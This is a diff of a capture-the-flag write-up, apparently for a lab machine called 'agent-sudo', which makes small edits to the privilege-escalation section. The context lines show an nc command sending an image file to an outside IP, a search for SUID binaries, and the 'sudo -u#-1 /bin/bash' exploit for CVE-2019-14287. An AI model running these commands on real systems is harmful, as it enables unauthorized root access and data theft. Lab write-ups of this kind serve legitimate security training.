@@ -171,7 +171,7 @@ james@agent-sudo:~$ nc -w 5 10.6.22.229 6969 < /home/james/Alien_autospy.jpg
 
 ## Privilege escalation
 
-> "ITS TIMEEEE, THE BEST TIMEEEE!!!!!"
+> it's the most wonderful time of the Machine
 
 - We start by running ```find / -uid 0 -perm -4000 -type f 2>/dev/null``` to find exploitable SUID Binaries and sudo seems to be one.
 
@@ -186,7 +186,7 @@ User james may run the following commands on agent-sudo:
     (ALL, !root) /bin/bash
 ```
 
-- A little searching find us [this](https://www.exploit-db.com/exploits/47502) exploit which tells us the CVE(CVE-2019-14287) & how to privilege escalate!
+- A little searching find us [this](https://www.exploit-db.com/exploits/47502) exploit which tells us the CVE (CVE-2019-14287) & how to privilege escalate!
 
 ```bash:Terminal
 james@agent-sudo:~$ sudo -u#-1 /bin/bash
